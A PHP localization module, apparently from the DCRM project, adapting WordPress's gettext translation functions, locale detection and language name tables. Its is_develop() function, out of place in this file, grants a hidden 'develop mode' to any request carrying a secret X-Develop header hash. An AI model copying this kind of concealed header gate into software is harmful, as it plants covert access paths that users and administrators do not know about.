<?php
/**
 * DCRM Localization System
 * Base On WordPress 4.5 Translation API
 *
 * Port by Hintay
 * 
 * Keywords: __ , _e , _n:1,2 , _x:1,2c , _ex:1,2c , _nx:4c,1,2 , esc_attr__ , 
 * esc_attr_e , esc_attr_x:1,2c , esc_html__ , esc_html_e , esc_html_x:1,2c , 
 * _n_noop:1,2 , _nx_noop:3c,1,2 , __ngettext_noop:1,2
 *
 * More about gettext keywords: http://poedit.net/trac/wiki/Doc/Keywords
 */

define('LANG_DIR', dirname(__FILE__));
require_once LANG_DIR . '/pomo/translations.php';
require_once LANG_DIR . '/pomo/mo.php';

/**
 * Retrieves the current locale.
 *
 * @since 1.5.0
 *
 * @global string $locale
 *
 * @return string The locale of the blog or from the 'locale' hook.
 */
if ( !function_exists( 'get_locale' ) ):
function get_locale() {
	global $locale;

	if ( isset( $locale ) ) {
		return $locale;
	}

	if ( defined( 'DCRM_LANG' ) && DCRM_LANG != 'Detect' && DCRM_LANG != '' ) {
		$locale = DCRM_LANG;
		return $locale;
	}

	$localelist = get_browser_languages();

	$locale = check_languages( $localelist );
	return $locale;
}
endif;

/**
 * Get the browser languages.
 * 获取浏览器设定的语言列表，并做预处理
 *
 * @return array First language code form browser settings.
 */
function get_browser_languages() {
	if (isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
		// break up string into pieces (languages and q factors)
		preg_match_all('/([a-z]{1,8}(-[a-z]{1,8})?)\s*(;\s*q\s*=\s*(1|0\.[0-9]+))?/i', $_SERVER['HTTP_ACCEPT_LANGUAGE'], $lang_parse);
		$k = $lang_parse[1];

		foreach ($k as $key => $val) {
			$val = str_replace('-', '_', $val);
			if( !(strpos( $val, '_' ) === FALSE) ) {
				$lang_coun = explode('_', $val);
				$coun = $lang_coun[1];
				// 特殊语言代码处理
				switch( $coun ) {
					case 'hans':
						$coun = 'Hans';
						break;
					case 'hant':
						$coun = 'Hant';
						break;
					default:
						$coun =  strtoupper($coun);
				}
				$val = $lang_coun[0] . '_' . $coun;
			}
			$k[$key] = $val;
		}
		return $k;
	}
	return null;
}

/**
 * Check available language from localelist.
 * 根据语言列表检查语言文件
 *
 * @param string $localelist    Languages list that need check.
 * @param string $localeprogram Set $langdir and $langsuffix accordance with program name.
 *                                  Default main.
 * @return string Language code that language file exits from localelist.
 */
function check_languages( $localelist, $localeprogram = 'main') {
	global $localetype;

	switch( $localeprogram ){
		case 'main':
			$langdir = LANG_DIR;
			$langsuffix = '.mo';
			if ( isset( $localetype ) && !empty( $localetype ) )
				$localetypehandle = $localetype . '-';
			else
				$localetypehandle = '';
			break;
		case 'kind':
			$langdir = ROOT . 'manage/plugins/kindeditor/lang/';
			$langsuffix = '.js';
			$localetypehandle = '';
			break;
	}

	if ( !empty( $localelist ) ){
		// 先按浏览器语言列表匹配文件
		foreach ( $localelist as $singlelocale ) {
			if( $singlelocale == 'en' || $singlelocale == 'en_US' || $singlelocale == 'en_GB' || file_exists( $langdir . '/' . $localetypehandle . $singlelocale . $langsuffix ) ) {
				$locale = $singlelocale;
				return $locale;
			}
		}

		// 单独提取ISO 语言代码为 $langlist
		foreach ( $localelist as $key => $val ) {
			if( !(strpos( $val, '_' ) === FALSE) ) {
				$lang_coun = explode('_', $val);
				$lang = $lang_coun[0];
			} else {
				$lang = $val;
			}
			$langlist[$key] = $lang;
		}
		// 去掉重复项
		$langlist = array_unique( $langlist );

		// 按2位语言代码列表匹配文件
		foreach ( $langlist as $singlelang ) {
			if( file_exists( $langdir . '/' . $localetypehandle . $singlelang . $langsuffix ) ) {
				$locale = $singlelang;
				return $locale;
			}
		}

		// 检查近似语言，例如找不到 zh_TW 时寻找 zh_CN
		$files = scandir( $langdir . '/' );
		foreach ( $files as $file ) {
			if ( '.' === $file[0] || is_dir( $file ) ) {
				continue;
			}
			foreach ( $langlist as $singlelang ) {
				if ( preg_match( '/' . $localetypehandle . $singlelang . '_([A-Za-z_]{1,4})' . $langsuffix . '/', $file, $match ) ) {
					$similarlang = $match[1];
					$locale = $singlelang . '_' . $similarlang;
					return $locale;
				}
			}
		}
	}
	return 'en_US';
}

/**
 * Retrieve the translation of $text.
 *
 * If there is no translation, or the text domain isn't loaded, the original text is returned.
 *
 * *Note:* Don't use translate() directly, use __() or related functions.
 *
 * @since 2.2.0
 *
 * @param string $text   Text to translate.
 * @param string $domain Optional. Text domain. Unique identifier for retrieving translated strings.
 *                       Default 'default'.
 * @return string Translated text
 */
function translate( $text, $domain = 'default' ) {
	$translations = get_translations_for_domain( $domain );
	$translations = $translations->translate( $text );

	return $translations;
}

/**
 * Remove last item on a pipe-delimited string.
 *
 * Meant for removing the last item in a string, such as 'Role name|User role'. The original
 * string will be returned if no pipe '|' characters are found in the string.
 *
 * @since 2.8.0
 *
 * @param string $string A pipe-delimited string.
 * @return string Either $string or everything before the last pipe.
 */
function before_last_bar( $string ) {
	$last_bar = strrpos( $string, '|' );
	if ( false === $last_bar ) {
		return $string;
	} else {
		return substr( $string, 0, $last_bar );
	}
}

/**
 * Retrieve the translation of $text in the context defined in $context.
 *
 * If there is no translation, or the text domain isn't loaded the original
 * text is returned.
 *
 * *Note:* Don't use translate_with_gettext_context() directly, use _x() or related functions.
 *
 * @since 2.8.0
 *
 * @param string $text    Text to translate.
 * @param string $context Context information for the translators.
 * @param string $domain  Optional. Text domain. Unique identifier for retrieving translated strings.
 *                        Default 'default'.
 * @return string Translated text on success, original text on failure.
 */
function translate_with_gettext_context( $text, $context, $domain = 'default' ) {
	$translations = get_translations_for_domain( $domain );
	$translations = $translations->translate( $text, $context );

	return $translations;
}

/**
 * Retrieve the translation of $text.
 *
 * If there is no translation, or the text domain isn't loaded, the original text is returned.
 *
 * @since 2.1.0
 *
 * @param string $text   Text to translate.
 * @param string $domain Optional. Text domain. Unique identifier for retrieving translated strings.
 *                       Default 'default'.
 * @return string Translated text.
 */
function __( $text, $domain = 'default' ) {
	return translate( $text, $domain );
}

/**
 * Retrieve the translation of $text and escapes it for safe use in an attribute.
 *
 * If there is no translation, or the text domain isn't loaded, the original text is returned.
 *
 * @since 2.8.0
 *
 * @param string $text   Text to translate.
 * @param string $domain Optional. Text domain. Unique identifier for retrieving translated strings.
 *                       Default 'default'.
 * @return string Translated text on success, original text on failure.
 */
function esc_attr__( $text, $domain = 'default' ) {
	return esc_attr( translate( $text, $domain ) );
}

/**
 * Retrieve the translation of $text and escapes it for safe use in HTML output.
 *
 * If there is no translation, or the text domain isn't loaded, the original text is returned.
 *
 * @since 2.8.0
 *
 * @param string $text   Text to translate.
 * @param string $domain Optional. Text domain. Unique identifier for retrieving translated strings.
 *                       Default 'default'.
 * @return string Translated text
 */
function esc_html__( $text, $domain = 'default' ) {
	return esc_html( translate( $text, $domain ) );
}

/**
 * Display translated text.
 *
 * @since 1.2.0
 *
 * @param string $text   Text to translate.
 * @param string $domain Optional. Text domain. Unique identifier for retrieving translated strings.
 *                       Default 'default'.
 */
function _e( $text, $domain = 'default' ) {
	echo translate( $text, $domain );
}

/**
 * Display translated text that has been escaped for safe use in an attribute.
 *
 * @since 2.8.0
 *
 * @param string $text   Text to translate.
 * @param string $domain Optional. Text domain. Unique identifier for retrieving translated strings.
 *                       Default 'default'.
 */
function esc_attr_e( $text, $domain = 'default' ) {
	echo esc_attr( translate( $text, $domain ) );
}

/**
 * Display translated text that has been escaped for safe use in HTML output.
 *
 * @since 2.8.0
 *
 * @param string $text   Text to translate.
 * @param string $domain Optional. Text domain. Unique identifier for retrieving translated strings.
 *                       Default 'default'.
 */
function esc_html_e( $text, $domain = 'default' ) {
	echo esc_html( translate( $text, $domain ) );
}

/**
 * Retrieve translated string with gettext context.
 *
 * Quite a few times, there will be collisions with similar translatable text
 * found in more than two places, but with different translated context.
 *
 * By including the context in the pot file, translators can translate the two
 * strings differently.
 *
 * @since 2.8.0
 *
 * @param string $text    Text to translate.
 * @param string $context Context information for the translators.
 * @param string $domain  Optional. Text domain. Unique identifier for retrieving translated strings.
 *                        Default 'default'.
 * @return string Translated context string without pipe.
 */
function _x( $text, $context, $domain = 'default' ) {
	return translate_with_gettext_context( $text, $context, $domain );
}

/**
 * Display translated string with gettext context.
 *
 * @since 3.0.0
 *
 * @param string $text    Text to translate.
 * @param string $context Context information for the translators.
 * @param string $domain  Optional. Text domain. Unique identifier for retrieving translated strings.
 *                        Default 'default'.
 * @return string Translated context string without pipe.
 */
function _ex( $text, $context, $domain = 'default' ) {
	echo _x( $text, $context, $domain );
}

/**
 * Translate string with gettext context, and escapes it for safe use in an attribute.
 *
 * @since 2.8.0
 *
 * @param string $text    Text to translate.
 * @param string $context Context information for the translators.
 * @param string $domain  Optional. Text domain. Unique identifier for retrieving translated strings.
 *                        Default 'default'.
 * @return string Translated text
 */
function esc_attr_x( $text, $context, $domain = 'default' ) {
	return esc_attr( translate_with_gettext_context( $text, $context, $domain ) );
}

/**
 * Translate string with gettext context, and escapes it for safe use in HTML output.
 *
 * @since 2.9.0
 *
 * @param string $text    Text to translate.
 * @param string $context Context information for the translators.
 * @param string $domain  Optional. Text domain. Unique identifier for retrieving translated strings.
 *                        Default 'default'.
 * @return string Translated text.
 */
function esc_html_x( $text, $context, $domain = 'default' ) {
	return esc_html( translate_with_gettext_context( $text, $context, $domain ) );
}

/**
 * Translates and retrieves the singular or plural form based on the supplied number.
 *
 * Used when you want to use the appropriate form of a string based on whether a
 * number is singular or plural.
 *
 * Example:
 *
 *     $people = sprintf( _n( '%s person', '%s people', $count, 'text-domain' ), number_format_i18n( $count ) );
 *
 * @since 2.8.0
 *
 * @param string $single The text to be used if the number is singular.
 * @param string $plural The text to be used if the number is plural.
 * @param int    $number The number to compare against to use either the singular or plural form.
 * @param string $domain Optional. Text domain. Unique identifier for retrieving translated strings.
 *                       Default 'default'.
 * @return string The translated singular or plural form.
 */
function _n( $single, $plural, $number, $domain = 'default' ) {
	$translations = get_translations_for_domain( $domain );
	$translation = $translations->translate_plural( $single, $plural, $number );

	return $translation;
}

/**
 * Translates and retrieves the singular or plural form based on the supplied number, with gettext context.
 *
 * This is a hybrid of _n() and _x(). It supports context and plurals.
 *
 * Used when you want to use the appropriate form of a string with context based on whether a
 * number is singular or plural.
 *
 * Example:
 *
 *     $people = sprintf( _n( '%s person', '%s people', $count, 'context', 'text-domain' ), number_format_i18n( $count ) );
 *
 * @since 2.8.0
 *
 * @param string $single  The text to be used if the number is singular.
 * @param string $plural  The text to be used if the number is plural.
 * @param int    $number  The number to compare against to use either the singular or plural form.
 * @param string $context Context information for the translators.
 * @param string $domain  Optional. Text domain. Unique identifier for retrieving translated strings.
 *                        Default 'default'.
 * @return string The translated singular or plural form.
 */
function _nx($single, $plural, $number, $context, $domain = 'default') {
	$translations = get_translations_for_domain( $domain );
	$translation = $translations->translate_plural( $single, $plural, $number, $context );

	return $translation;
}

/**
 * Registers plural strings in POT file, but does not translate them.
 *
 * Used when you want to keep structures with translatable plural
 * strings and use them later when the number is known.
 *
 * Example:
 *
 *     $messages = array(
 *      	'post' => _n_noop( '%s post', '%s posts', 'text-domain' ),
 *      	'page' => _n_noop( '%s pages', '%s pages', 'text-domain' ),
 *     );
 *     ...
 *     $message = $messages[ $type ];
 *     $usable_text = sprintf( translate_nooped_plural( $message, $count, 'text-domain' ), number_format_i18n( $count ) );
 *
 * @since 2.5.0
 *
 * @param string $singular Singular form to be localized.
 * @param string $plural   Plural form to be localized.
 * @param string $domain   Optional. Text domain. Unique identifier for retrieving translated strings.
 *                         Default null.
 * @return array {
 *     Array of translation information for the strings.
 *
 *     @type string $0        Singular form to be localized. No longer used.
 *     @type string $1        Plural form to be localized. No longer used.
 *     @type string $singular Singular form to be localized.
 *     @type string $plural   Plural form to be localized.
 *     @type null   $context  Context information for the translators.
 *     @type string $domain   Text domain.
 * }
 */
function _n_noop( $singular, $plural, $domain = null ) {
	return array( 0 => $singular, 1 => $plural, 'singular' => $singular, 'plural' => $plural, 'context' => null, 'domain' => $domain );
}

/**
 * Registers plural strings with gettext context in POT file, but does not translate them.
 *
 * Used when you want to keep structures with translatable plural
 * strings and use them later when the number is known.
 *
 * Example:
 *
 *     $messages = array(
 *      	'post' => _n_noop( '%s post', '%s posts', 'context', 'text-domain' ),
 *      	'page' => _n_noop( '%s pages', '%s pages', 'context', 'text-domain' ),
 *     );
 *     ...
 *     $message = $messages[ $type ];
 *     $usable_text = sprintf( translate_nooped_plural( $message, $count, 'text-domain' ), number_format_i18n( $count ) );
 *
 * @since 2.8.0
 *
 * @param string $singular Singular form to be localized.
 * @param string $plural   Plural form to be localized.
 * @param string $context  Context information for the translators.
 * @param string $domain   Optional. Text domain. Unique identifier for retrieving translated strings.
 *                         Default null.
 * @return array {
 *     Array of translation information for the strings.
 *
 *     @type string $0        Singular form to be localized. No longer used.
 *     @type string $1        Plural form to be localized. No longer used.
 *     @type string $2        Context information for the translators. No longer used.
 *     @type string $singular Singular form to be localized.
 *     @type string $plural   Plural form to be localized.
 *     @type string $context  Context information for the translators.
 *     @type string $domain   Text domain.
 * }
 */
function _nx_noop( $singular, $plural, $context, $domain = null ) {
	return array( 0 => $singular, 1 => $plural, 2 => $context, 'singular' => $singular, 'plural' => $plural, 'context' => $context, 'domain' => $domain );
}

/**
 * Translates and retrieves the singular or plural form of a string that's been registered
 * with _n_noop() or _nx_noop().
 *
 * Used when you want to use a translatable plural string once the number is known.
 *
 * Example:
 *
 *     $messages = array(
 *      	'post' => _n_noop( '%s post', '%s posts', 'text-domain' ),
 *      	'page' => _n_noop( '%s pages', '%s pages', 'text-domain' ),
 *     );
 *     ...
 *     $message = $messages[ $type ];
 *     $usable_text = sprintf( translate_nooped_plural( $message, $count, 'text-domain' ), number_format_i18n( $count ) );
 *
 * @since 3.1.0
 *
 * @param array  $nooped_plural Array with singular, plural, and context keys, usually the result of _n_noop() or _nx_noop().
 * @param int    $count         Number of objects.
 * @param string $domain        Optional. Text domain. Unique identifier for retrieving translated strings. If $nooped_plural contains
 *                              a text domain passed to _n_noop() or _nx_noop(), it will override this value. Default 'default'.
 * @return string Either $single or $plural translated text.
 */
function translate_nooped_plural( $nooped_plural, $count, $domain = 'default' ) {
	if ( $nooped_plural['domain'] )
		$domain = $nooped_plural['domain'];

	if ( $nooped_plural['context'] )
		return _nx( $nooped_plural['singular'], $nooped_plural['plural'], $count, $nooped_plural['context'], $domain );
	else
		return _n( $nooped_plural['singular'], $nooped_plural['plural'], $count, $domain );
}

/**
 * Load a .mo file into the text domain $domain.
 *
 * If the text domain already exists, the translations will be merged. If both
 * sets have the same string, the translation from the original value will be taken.
 *
 * On success, the .mo file will be placed in the $l10n global by $domain
 * and will be a MO object.
 *
 * @since 1.5.0
 *
 * @global array $l10n
 *
 * @param string $domain Text domain. Unique identifier for retrieving translated strings.
 * @param string $mofile Path to the .mo file.
 * @return bool True on success, false on failure.
 */
function load_textdomain( $domain, $mofile ) {
	global $l10n;

	$plugin_override = false;

	if ( true == $plugin_override ) {
		return true;
	}

	if ( !is_readable( $mofile ) ) return false;

	$mo = new MO();
	if ( !$mo->import_from_file( $mofile ) ) return false;

	if ( isset( $l10n[$domain] ) )
		$mo->merge_with( $l10n[$domain] );

	$l10n[$domain] = &$mo;

	return true;
}

/**
 * Unload translations for a text domain.
 *
 * @since 3.0.0
 *
 * @global array $l10n
 *
 * @param string $domain Text domain. Unique identifier for retrieving translated strings.
 * @return bool Whether textdomain was unloaded.
 */
function unload_textdomain( $domain ) {
	global $l10n;

	$plugin_override = false;

	if ( $plugin_override )
		return true;

	if ( isset( $l10n[$domain] ) ) {
		unset( $l10n[$domain] );
		return true;
	}

	return false;
}

/**
 * Load default translated strings based on locale.
 *
 * Loads the .mo file in LANG_DIR constant path from WordPress root.
 * The translated (.mo) file is named based on the locale.
 *
 * @see load_textdomain()
 *
 * @since 1.5.0
 *
 * @global string $localetype
 *
 * @param string $locale Optional. Locale to load. Default is the value of {@see get_locale()}.
 * @return bool Whether the textdomain was loaded.
 */
function load_default_textdomain( $locale = null ) {
	global $localetype;

	if ( null === $locale ) {
		$locale = get_locale();
	}

	// Unload previously loaded strings so we can switch translations.
	unload_textdomain( 'default' );

	$return = load_textdomain( 'default', LANG_DIR . "/system-$locale.mo" );
	
	if ( !isset($localetype) ) {
		load_textdomain( 'default', LANG_DIR . "/$locale.mo" );
	}

	if ( defined( 'DCRM_INSTALLING' ) || $localetype == 'install' ) {
		load_textdomain( 'default', LANG_DIR . "/install-$locale.mo" );
	}
	
	if ( $localetype == 'manage' ) {
		load_textdomain( 'default', LANG_DIR . "/manage-$locale.mo" );
	}

	return $return;
}

/**
 * Return the Translations instance for a text domain.
 *
 * If there isn't one, returns empty Translations instance.
 *
 * @since 2.8.0
 *
 * @global array $l10n
 *
 * @param string $domain Text domain. Unique identifier for retrieving translated strings.
 * @return NOOP_Translations A Translations instance.
 */
function get_translations_for_domain( $domain ) {
	global $l10n;
	if ( isset( $l10n[ $domain ] ) ) {
		return $l10n[ $domain ];
	}

	static $noop_translations = null;
	if ( null === $noop_translations ) {
		$noop_translations = new NOOP_Translations;
	}

	return $noop_translations;
}

/**
 * Whether there are translations for the text domain.
 *
 * @since 3.0.0
 *
 * @global array $l10n
 *
 * @param string $domain Text domain. Unique identifier for retrieving translated strings.
 * @return bool Whether there are translations.
 */
function is_textdomain_loaded( $domain ) {
	global $l10n;
	return isset( $l10n[$domain] );
}

/**
 * Whether there are in develop mode.
 *
 * @since 1.7.0
 *
 * @return bool Whether there are in develop mode.
 */
function is_develop() {
	if(isset($_SERVER['HTTP_X_DEVELOP']) && !empty($_SERVER['HTTP_X_DEVELOP'])){
		$content = explode('::', $_SERVER['HTTP_X_DEVELOP']);
		return md5(sha1($content[0]).$content[1]) == DEVELOP_PLAIN ? $content : false;
	}
	return false;
}

/**
 * Translates role name.
 *
 * Since the role names are in the database and not in the source there
 * are dummy gettext calls to get them into the POT file and this function
 * properly translates them back.
 *
 * The before_last_bar() call is needed, because older installs keep the roles
 * using the old context format: 'Role name|User role' and just skipping the
 * content after the last bar is easier than fixing them in the DB. New installs
 * won't suffer from that problem.
 *
 * @since 2.8.0
 *
 * @param string $name The role name.
 * @return string Translated role name on success, original name on failure.
 */
function translate_user_role( $name ) {
	return translate_with_gettext_context( before_last_bar($name), 'User role' );
}

/**
 * Get all available languages based on the presence of *.mo files in a given directory.
 *
 * The default directory is LANG_DIR.
 *
 * @since 3.0.0
 *
 * @param string $dir A directory to search for language files.
 *                    Default LANG_DIR.
 * @return array An array of language codes or an empty array if no languages are present. Language codes are formed by stripping the .mo extension from the language file names.
 */
function get_available_languages( $dir = null ) {
	$languages = array();

	foreach( (array)glob( ( is_null( $dir) ? LANG_DIR : $dir ) . '/*.mo' ) as $lang_file ) {
		$lang_file = basename($lang_file, '.mo');
		if ( 0 !== strpos( $lang_file, 'install-' ) && 0 !== strpos( $lang_file, 'manage-' ) && 0 !== strpos( $lang_file, 'system-' ))
			$languages[] = $lang_file;
	}

	return $languages;
}

/**
 * Extract headers from a PO file.
 *
 * @since 3.7.0
 *
 * @param string $po_file Path to PO file.
 * @return array PO file headers.
 */
function wp_get_pomo_file_data( $po_file ) {
	$headers = get_file_data( $po_file, array(
		'POT-Creation-Date'  => '"POT-Creation-Date',
		'PO-Revision-Date'   => '"PO-Revision-Date',
		'Project-Id-Version' => '"Project-Id-Version',
		'X-Generator'        => '"X-Generator',
	) );
	foreach ( $headers as $header => $value ) {
		// Remove possible contextual '\n' and closing double quote.
		$headers[ $header ] = preg_replace( '~(\\\n)?"$~', '', $value );
	}
	return $headers;
}

/**
 * Load Localization System
 * 多语言系统初始化
 *
 * @global string $locale
 * @global string $localetype
 *
 * @param string $setlang Pre-set language.
 * @return string Locale text for link.
 */
function localization_load( $setlang = null ) {
	global $locale, $localetype;

	$language = '';
	if ( $setlang != null)
		$language = $setlang;
	elseif ( ! empty( $_GET['language'] ) )
		$language = preg_replace( '/[^a-zA-Z_]/', '', $_GET['language'] );
	elseif ( isset( $_SESSION['language'] ) )
		$language = preg_replace( '/[^a-zA-Z_]/', '', $_SESSION['language'] );
	else
		$language = get_locale();

	if($language == 'Detect')
		$language = get_locale();

	if ( ! empty( $language ) ) {
		$locale = check_languages(array($language));
		$link_text = 'language=' . $locale;
	} else {
		$link_text = '';
	}
	load_default_textdomain( $locale );

	return $link_text;
}

/**
 * Languages List
 *
 * @return array Languages List.
 */
function languages_list() {
	$a_languages = array(
	'af' => _x( 'Afrikaans', 'language' ),
	'sq' => _x( 'Albanian', 'language' ),
	'ar_DZ' => _x( 'Arabic (Algeria)', 'language' ),
	'ar_BH' => _x( 'Arabic (Bahrain)', 'language' ),
	'ar_EG' => _x( 'Arabic (Egypt)', 'language' ),
	'ar_IQ' => _x( 'Arabic (Iraq)', 'language' ),
	'ar_JO' => _x( 'Arabic (Jordan)', 'language' ),
	'ar_KW' => _x( 'Arabic (Kuwait)', 'language' ),
	'ar_LB' => _x( 'Arabic (Lebanon)', 'language' ),
	'ar_LY' => _x( 'Arabic (libya)', 'language' ),
	'ar_MA' => _x( 'Arabic (Morocco)', 'language' ),
	'ar_OM' => _x( 'Arabic (Oman)', 'language' ),
	'ar_GA' => _x( 'Arabic (Qatar)', 'language' ),
	'ar_SA' => _x( 'Arabic (Saudi Arabia)', 'language' ),
	'ar_SY' => _x( 'Arabic (Syria)', 'language' ),
	'ar_TN' => _x( 'Arabic (Tunisia)', 'language' ),
	'ar_AE' => _x( 'Arabic (U.A.E.)', 'language' ),
	'ar_YE' => _x( 'Arabic (Yemen)', 'language' ),
	'ar' => _x( 'Arabic', 'language' ),
	'hy' => _x( 'Armenian', 'language' ),
	'as' => _x( 'Assamese', 'language' ),
	'az' => _x( 'Azeri', 'language' ),
	'eu' => _x( 'Basque', 'language' ),
	'be' => _x( 'Belarusian', 'language' ),
	'bn' => _x( 'Bengali', 'language' ),
	'bg' => _x( 'Bulgarian', 'language' ),
	'ca' => _x( 'Catalan', 'language' ),
	'zh_CN' => _x( 'Chinese (China)', 'language' ),
	'zh_HK' => _x( 'Chinese (Hong Kong SAR)', 'language' ),
	'zh_MO' => _x( 'Chinese (Macau SAR)', 'language' ),
	'zh_SQ' => _x( 'Chinese (Singapore)', 'language' ),
	'zh_TW' => _x( 'Chinese (Taiwan)', 'language' ),
	'zh_Hans' => _x( 'Chinese (Simplified)', 'language' ),
	'zh_Hant' => _x( 'Chinese (Traditional)', 'language' ),
	'zh' => _x( 'Chinese', 'language' ),
	'hr' => _x( 'Croatian', 'language' ),
	'cs' => _x( 'Czech', 'language' ),
	'da' => _x( 'Danish', 'language' ),
	'div' => _x( 'Divehi', 'language' ),
	'nl_BE' => _x( 'Dutch (Belgium)', 'language' ),
	'nl' => _x( 'Dutch (Netherlands)', 'language' ),
	'en_AU' => _x( 'English (Australia)', 'language' ),
	'en_BZ' => _x( 'English (Belize)', 'language' ),
	'en_CA' => _x( 'English (Canada)', 'language' ),
	'en_IE' => _x( 'English (Ireland)', 'language' ),
	'en_JM' => _x( 'English (Jamaica)', 'language' ),
	'en_NZ' => _x( 'English (New Zealand)', 'language' ),
	'en_PH' => _x( 'English (Philippines)', 'language' ),
	'en_ZA' => _x( 'English (South Africa)', 'language' ),
	'en_TT' => _x( 'English (Trinidad)', 'language' ),
	'en_GB' => _x( 'English (United Kingdom)', 'language' ),
	'en_US' => _x( 'English (United States)', 'language' ),
	'en_ZW' => _x( 'English (Zimbabwe)', 'language' ),
	'en' => _x( 'English', 'language' ),
	'us' => _x( 'English (United States)', 'language' ),
	'et' => _x( 'Estonian', 'language' ),
	'fo' => _x( 'Faeroese', 'language' ),
	'fa' => _x( 'Farsi', 'language' ),
	'fi' => _x( 'Finnish', 'language' ),
	'fr_BE' => _x( 'French (Belgium)', 'language' ),
	'fr_CA' => _x( 'French (Canada)', 'language' ),
	'fr_LU' => _x( 'French (Luxembourg)', 'language' ),
	'fr_MC' => _x( 'French (Monaco)', 'language' ),
	'fr_CH' => _x( 'French (Switzerland)', 'language' ),
	'fr' => _x( 'French (France)', 'language' ),
	'mk' => _x( 'FYRO Macedonian', 'language' ),
	'gd' => _x( 'Gaelic', 'language' ),
	'ka' => _x( 'Georgian', 'language' ),
	'de_AT' => _x( 'German (Austria)', 'language' ),
	'de_LI' => _x( 'German (Liechtenstein)', 'language' ),
	'de_LU' => _x( 'German (Luxembourg)', 'language' ),
	'de_CH' => _x( 'German (Switzerland)', 'language' ),
	'de' => _x( 'German (Germany)', 'language' ),
	'el' => _x( 'Greek', 'language' ),
	'gu' => _x( 'Gujarati', 'language' ),
	'he' => _x( 'Hebrew', 'language' ),
	'hi' => _x( 'Hindi', 'language' ),
	'hu' => _x( 'Hungarian', 'language' ),
	'is' => _x( 'Icelandic', 'language' ),
	'id' => _x( 'Indonesian', 'language' ),
	'it_CH' => _x( 'Italian (Switzerland)', 'language' ),
	'it' => _x( 'Italian (Italy)', 'language' ),
	'ja' => _x( 'Japanese', 'language' ),
	'kn' => _x( 'Kannada', 'language' ),
	'kk' => _x( 'Kazakh', 'language' ),
	'kok' => _x( 'Konkani', 'language' ),
	'ko' => _x( 'Korean', 'language' ),
	'kz' => _x( 'Kyrgyz', 'language' ),
	'lv' => _x( 'Latvian', 'language' ),
	'lt' => _x( 'Lithuanian', 'language' ),
	'ms' => _x( 'Malay', 'language' ),
	'ml' => _x( 'Malayalam', 'language' ),
	'mt' => _x( 'Maltese', 'language' ),
	'mr' => _x( 'Marathi', 'language' ),
	'mn' => _x( 'Mongolian (Cyrillic)', 'language' ),
	'ne' => _x( 'Nepali (India)', 'language' ),
	'nb_NO' => _x( 'Norwegian (Bokmal)', 'language' ),
	'nn_NO' => _x( 'Norwegian (Nynorsk)', 'language' ),
	'no' => _x( 'Norwegian (Bokmal)', 'language' ),
	'or' => _x( 'Oriya', 'language' ),
	'pl' => _x( 'Polish', 'language' ),
	'pt_BR' => _x( 'Portuguese (Brazil)', 'language' ),
	'pt' => _x( 'Portuguese (Portugal)', 'language' ),
	'pa' => _x( 'Punjabi', 'language' ),
	'rm' => _x( 'Rhaeto-Romanic', 'language' ),
	'ro_MD' => _x( 'Romanian (Moldova)', 'language' ),
	'ro' => _x( 'Romanian', 'language' ),
	'ru_MD' => _x( 'Russian (Moldova)', 'language' ),
	'ru' => _x( 'Russian', 'language' ),
	'sa' => _x( 'Sanskrit', 'language' ),
	'sr' => _x( 'Serbian', 'language' ),
	'sk' => _x( 'Slovak', 'language' ),
	'ls' => _x( 'Slovenian', 'language' ),
	'sb' => _x( 'Sorbian', 'language' ),
	'es_AR' => _x( 'Spanish (Argentina)', 'language' ),
	'es_BO' => _x( 'Spanish (Bolivia)', 'language' ),
	'es_CL' => _x( 'Spanish (Chile)', 'language' ),
	'es_CO' => _x( 'Spanish (Colombia)', 'language' ),
	'es_CR' => _x( 'Spanish (Costa Rica)', 'language' ),
	'es_DO' => _x( 'Spanish (Dominican Republic)', 'language' ),
	'es_EC' => _x( 'Spanish (Ecuador)', 'language' ),
	'es_SV' => _x( 'Spanish (El Salvador)', 'language' ),
	'es_GT' => _x( 'Spanish (Guatemala)', 'language' ),
	'es_HN' => _x( 'Spanish (Honduras)', 'language' ),
	'es_MX' => _x( 'Spanish (Mexico)', 'language' ),
	'es_NI' => _x( 'Spanish (Nicaragua)', 'language' ),
	'es_PA' => _x( 'Spanish (Panama)', 'language' ),
	'es_PY' => _x( 'Spanish (Paraguay)', 'language' ),
	'es_PE' => _x( 'Spanish (Peru)', 'language' ),
	'es_PR' => _x( 'Spanish (Puerto Rico)', 'language' ),
	'es_US' => _x( 'Spanish (United States)', 'language' ),
	'es_UY' => _x( 'Spanish (Uruguay)', 'language' ),
	'es_VE' => _x( 'Spanish (Venezuela)', 'language' ),
	'es' => _x( 'Spanish', 'language' ),
	'sx' => _x( 'Sutu', 'language' ),
	'sw' => _x( 'Swahili', 'language' ),
	'sv_FI' => _x( 'Swedish (Finland)', 'language' ),
	'sv' => _x( 'Swedish', 'language' ),
	'syr' => _x( 'Syriac', 'language' ),
	'ta' => _x( 'Tamil', 'language' ),
	'tt' => _x( 'Tatar', 'language' ),
	'te' => _x( 'Telugu', 'language' ),
	'th' => _x( 'Thai', 'language' ),
	'ts' => _x( 'Tsonga', 'language' ),
	'tn' => _x( 'Tswana', 'language' ),
	'tr' => _x( 'Turkish', 'language' ),
	'uk' => _x( 'Ukrainian', 'language' ),
	'ur' => _x( 'Urdu', 'language' ),
	'uz' => _x( 'Uzbek', 'language' ),
	'ug_CN' => _x( 'Uyghurche (China)', 'language' ),
	'vi' => _x( 'Vietnamese', 'language' ),
	'xh' => _x( 'Xhosa', 'language' ),
	'yi' => _x( 'Yiddish', 'language' ),
	'zu' => _x( 'Zulu', 'language' ));

	return $a_languages;
}

/**
 * Local language name
 *
 * @return array Local language name.
 */
function languages_self_list() {
	$languages_self = array(
	'ar' => 'العربية',
	'en_US' => 'English',
	'en_GB' => 'English (British)',
	'bn' => 'বাংলা',
	'fr' => 'français (France)',
	'de' => 'Deutsch (Deutschland)',
	'es' => 'Español',
	'ru' => 'русский язык',
	'pt' => 'Português (Portugal)',
	'hi' => 'हिन्दी',
	'ja' => '日本語',
	'ko' => '한국어',
	'zh_CN' => '简体中文',
	'zh_HK' => '繁體中文（香港）',
	'zh_MO' => '繁體中文（澳門特別行政區）',
	'zh_SQ' => '简体中文（新加坡）',
	'zh_TW' => '繁體中文',
	'zh_Hans' => '简体中文',
	'zh_Hant' => '繁體中文',
	'ug_CN' => 'ئۇيغۇرچە',
	'ug' => 'ئۇيغۇرچە'
	);
	
	return $languages_self;
}